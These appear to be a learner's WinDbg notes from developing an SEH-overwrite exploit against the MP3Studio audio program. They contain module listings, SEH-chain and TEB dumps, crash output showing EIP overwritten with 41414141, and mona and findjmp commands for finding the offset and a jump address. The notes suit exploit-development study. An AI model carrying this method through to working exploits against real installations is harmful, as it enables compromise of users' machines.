0:018> lmf
start    end        module name
00400000 005b7000   MP3Studio C:\mp3-millennium\MP3Studio.exe
05220000 05229000   xoutput  C:\mp3-millennium\xoutput.dll
10000000 10044000   xaudio   C:\mp3-millennium\xaudio.dll
714d0000 716df000   comctl32_714d0000 C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.17763.379_none_4d6572bf1b98bda7\comctl32.DLL
71a60000 71ae0000   DSOUND   C:\Windows\SYSTEM32\DSOUND.dll
71ae0000 71b3e000   MMDevAPI C:\Windows\SYSTEM32\MMDevAPI.DLL
71b40000 71c1b000   wintypes C:\Windows\SYSTEM32\wintypes.dll
71c20000 71e8a000   CoreUIComponents C:\Windows\System32\CoreUIComponents.dll
71e90000 71eb9000   ntmarta  C:\Windows\SYSTEM32\ntmarta.dll
71f80000 7200f000   CoreMessaging C:\Windows\System32\CoreMessaging.dll
72010000 72096000   TextInputFramework C:\Windows\System32\TextInputFramework.dll
720a0000 7221e000   PROPSYS  C:\Windows\SYSTEM32\PROPSYS.dll
722c0000 722e6000   dwmapi   C:\Windows\system32\dwmapi.dll
722f0000 7236b000   uxtheme  C:\Windows\system32\uxtheme.dll
72370000 72393000   winmmbase C:\Windows\SYSTEM32\winmmbase.dll
723a0000 723c4000   winmm    C:\Windows\SYSTEM32\winmm.dll
723d0000 72403000   IPHLPAPI C:\Windows\SYSTEM32\IPHLPAPI.DLL
72410000 7249e000   comctl32 C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.17763.379_none_5892bf0378a97e8e\comctl32.dll
724c0000 724e3000   DEVOBJ   C:\Windows\SYSTEM32\DEVOBJ.dll
72620000 72628000   WSOCK32  C:\Windows\SYSTEM32\WSOCK32.dll
72630000 7269b000   winspool C:\Windows\SYSTEM32\winspool.drv
726a0000 726b8000   mpr      C:\Windows\SYSTEM32\mpr.dll
74410000 74418000   version  C:\Windows\SYSTEM32\version.dll
74510000 7451a000   CRYPTBASE C:\Windows\System32\CRYPTBASE.dll
74520000 74540000   SspiCli  C:\Windows\System32\SspiCli.dll
74540000 74a8e000   SHELL32  C:\Windows\System32\SHELL32.dll
74a90000 74ae4000   powrprof C:\Windows\System32\powrprof.dll
74af0000 74b4f000   WS2_32   C:\Windows\System32\WS2_32.dll
74b50000 74cb7000   gdi32full C:\Windows\System32\gdi32full.dll
74cc0000 74d39000   sechost  C:\Windows\System32\sechost.dll
74de0000 74f02000   ucrtbase C:\Windows\System32\ucrtbase.dll
75360000 7549d000   MSCTF    C:\Windows\System32\MSCTF.dll
754a0000 754ae000   MSASN1   C:\Windows\System32\MSASN1.dll
754b0000 75649000   user32   C:\Windows\System32\user32.dll
756b0000 758aa000   KERNELBASE C:\Windows\System32\KERNELBASE.dll
758b0000 759ac000   ole32    C:\Windows\System32\ole32.dll
759c0000 75aba000   comdlg32 C:\Windows\System32\comdlg32.dll
75ac0000 75b40000   msvcp_win C:\Windows\System32\msvcp_win.dll
75b40000 75b57000   win32u   C:\Windows\System32\win32u.dll
75b60000 75c40000   KERNEL32 C:\Windows\System32\KERNEL32.DLL
75c40000 75d00000   msvcrt   C:\Windows\System32\msvcrt.dll
75d00000 75d19000   bcrypt   C:\Windows\System32\bcrypt.dll
75d20000 75d2f000   kernel_appcore C:\Windows\System32\kernel.appcore.dll
75d40000 75d63000   GDI32    C:\Windows\System32\GDI32.dll
75dd0000 75e59000   shcore   C:\Windows\System32\shcore.dll
75e60000 75ea4000   SHLWAPI  C:\Windows\System32\SHLWAPI.dll
75eb0000 75f12000   bcryptPrimitives C:\Windows\System32\bcryptPrimitives.dll
75f40000 7653c000   windows_storage C:\Windows\System32\windows.storage.dll
76540000 76552000   cryptsp  C:\Windows\System32\cryptsp.dll
76560000 7661f000   RPCRT4   C:\Windows\System32\RPCRT4.dll
76620000 76645000   IMM32    C:\Windows\System32\IMM32.DLL
76650000 768c8000   combase  C:\Windows\System32\combase.dll
768d0000 76a69000   CRYPT32  C:\Windows\System32\CRYPT32.dll
76bb0000 76c2e000   advapi32 C:\Windows\System32\advapi32.dll
76c30000 76c4c000   profapi  C:\Windows\System32\profapi.dll
76dc0000 76e5b000   oleaut32 C:\Windows\System32\oleaut32.dll
76e60000 76e9b000   cfgmgr32 C:\Windows\System32\cfgmgr32.dll
76eb0000 7704c000   ntdll    C:\Windows\SYSTEM32\ntdll.dll
0:018> s 00400000 l 005b7000 64 A1
00561890  64 a1 9f 60 97 98 64 9b-a2 5d 8b 99 43 6b 6a 44  d..`..d..]..CkjD
00561950  64 a1 9f 60 97 98 64 9b-a2 5d 8b 99 3a 58 65 3a  d..`..d..]..:Xe:
0056a649  64 a1 9a 58 85 8d 51 78-86 54 7c 8d 4f 74 85 4b  d..X..Qx.T|.Ot.K
0056a709  64 a1 9a 58 85 8d 51 78-86 50 75 85 50 76 87 51  d..X..Qx.Pu.Pv.Q
00682e41  64 a1 9a 58 85 8d 51 78-86 54 7c 8d 4f 74 85 4b  d..X..Qx.T|.Ot.K
00682f01  64 a1 9a 58 85 8d 51 78-86 50 75 85 50 76 87 51  d..X..Qx.Pu.Pv.Q
0069005c  64 a1 9f 60 97 98 64 9b-a2 5d 8b 99 43 6b 6a 44  d..`..d..]..CkjD
0069011c  64 a1 9f 60 97 98 64 9b-a2 5d 8b 99 3a 58 65 3a  d..`..d..]..:Xe:
0069ae8f  64 a1 9a 58 85 8d 51 78-86 54 7c 8d 4f 74 85 4b  d..X..Qx.T|.Ot.K
0069af4f  64 a1 9a 58 85 8d 51 78-86 50 75 85 50 76 87 51  d..X..Qx.Pu.Pv.Q

0x64 0xA1: Assembly Instruction to move ptr from fs:[0] to different exception handlers

TEB/TIB -> main function/main data block.
TEB has a pointer to the top of the SEH chain (aka the fs:[0] chain)

0:018> !exchain
03d0ff60: ntdll!_except_handler4+0 (76f286d0)
  CRT scope  0, filter: ntdll!DbgUiRemoteBreakin+3b (76f5b3ab)
                func:   ntdll!DbgUiRemoteBreakin+3f (76f5b3af)
03d0ffcc: ntdll!_except_handler4+0 (76f286d0)
  CRT scope  0, filter: ntdll!__RtlUserThreadStart+3c97b (76f52f79)
                func:   ntdll!__RtlUserThreadStart+3ca17 (76f53015)
03d0ffe4: ntdll!FinalExceptionHandlerPad18+0 (76f35192)
Invalid exception stack at ffffffff


0:018> d fs:[0]
0053:00000000  60 ff d0 03 00 00 d1 03-00 c0 d0 03 00 00 00 00 `...............
0053:00000010  00 1e 00 00 00 00 00 00-00 80 3a 00 00 00 00 00 ..........:.....
0053:00000020  a8 1c 00 00 2c 22 00 00-00 00 00 00 00 00 00 00 ....,"..........
0053:00000030  00 f0 36 00 00 00 00 00-00 00 00 00 00 00 00 00 ..6.............
0053:00000040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000050  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000060  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000070  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0:018> d 03d0ff60
03d0ff60  cc ff d0 03 d0 86 f2 76-24 26 c4 7e 00 00 00 00  .......v$&.~....
03d0ff70  80 ff d0 03 79 01 b8 75-00 00 00 00 60 01 b8 75  ....y..u....`..u
03d0ff80  dc ff d0 03 2d 66 f1 76-00 00 00 00 c0 4c ef 0b  ....-f.v.....L..
03d0ff90  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
03d0ffa0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
03d0ffb0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
03d0ffc0  00 00 00 00 8c ff d0 03-00 00 00 00 e4 ff d0 03  ................
03d0ffd0  d0 86 f2 76 5c 21 c4 7e-00 00 00 00 ec ff d0 03  ...v\!.~........
0:018> d 03d0ffcc
03d0ffcc  e4 ff d0 03 d0 86 f2 76-5c 21 c4 7e 00 00 00 00  .......v\!.~....
03d0ffdc  ec ff d0 03 fd 65 f1 76-ff ff ff ff 92 51 f3 76  .....e.v.....Q.v
03d0ffec  00 00 00 00 00 00 00 00-70 b3 f5 76 00 00 00 00  ........p..v....
03d0fffc  00 00 00 00 ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ....????????????
03d1000c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
03d1001c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
03d1002c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
03d1003c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
0:018> d 03d0ffe4
03d0ffe4  ff ff ff ff 92 51 f3 76-00 00 00 00 00 00 00 00  .....Q.v........
03d0fff4  70 b3 f5 76 00 00 00 00-00 00 00 00 ?? ?? ?? ??  p..v........????
03d10004  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
03d10014  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
03d10024  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
03d10034  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
03d10044  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
03d10054  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????

ffffffff is the end of the SEH chain

(1ca8.be8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000041 ebx=0019ea20 ecx=0000c351 edx=000015e0 esi=7ffb0222 edi=05f0bce8
eip=76f0fbc0 esp=0019e53c ebp=0019e550 iopl=0         nv up ei ng nz ac po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210293
ntdll!RtlUnicodeToMultiByteN+0x50:
76f0fbc0 88041a          mov     byte ptr [edx+ebx],al      ds:002b:001a0000=41

(1ca8.be8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000041 ebx=0019c24c ecx=0000c351 edx=00003db4 esi=7ffb0222 edi=05f0bce8
eip=76f0fbc0 esp=0019bd64 ebp=0019bd78 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210287
ntdll!RtlUnicodeToMultiByteN+0x50:
76f0fbc0 88041a          mov     byte ptr [edx+ebx],al      ds:002b:001a0000=41

(GET THE ERROR POP UP HERE, AFTER PRESS OKAY)

(1ca8.be8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\mp3-millennium\MP3Studio.exe
eax=0019d278 ebx=0019d278 ecx=00000000 edx=41414141 esi=0019c24c edi=00000000
eip=00403734 esp=0019c238 ebp=0019d2ac iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206
MP3Studio+0x3734:
00403734 8b4af8          mov     ecx,dword ptr [edx-8] ds:002b:41414139=????????

0:000> d fs:[0]
0053:00000000  60 d2 19 00 00 00 1a 00-00 90 19 00 00 00 00 00 `...............
0053:00000010  00 1e 00 00 00 00 00 00-00 e0 20 00 00 00 00 00 .......... .....
0053:00000020  84 04 00 00 ac 14 00 00-00 00 00 00 c0 fe e1 03 ................
0053:00000030  00 b0 20 00 00 00 00 00-00 00 00 00 00 00 00 00 .. .............
0053:00000040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000050  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000060  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000070  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0:000> d 0019d260
0019d260  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019d270  41 41 41 41 41 41 41 41-00 00 00 00 41 41 41 41  AAAAAAAA....AAAA
0019d280  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019d290  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019d2a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019d2b0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019d2c0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019d2d0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0:000>

0:000> g
(1ca8.be8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=76f35050 esi=00000000 edi=00000000
eip=41414141 esp=0019bc88 ebp=0019bca8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210246
41414141 ??              ???

Over here, when you try to access the TEB (fs:[0]), it should point to your overflowed buffer















!py mona pattern_create 50000

!py mona pattern_offset Fh2F 50000

https://windll.com/dll/microsoft-corporation/msvcr100#google_vignette

C:\Users\IEUser\Downloads\littleoldearthquake-master\littleoldearthquake-master\corelan\findjmp\findjmp\bin\findjmp.exe C:\mp3-millennium\xaudio.dll edi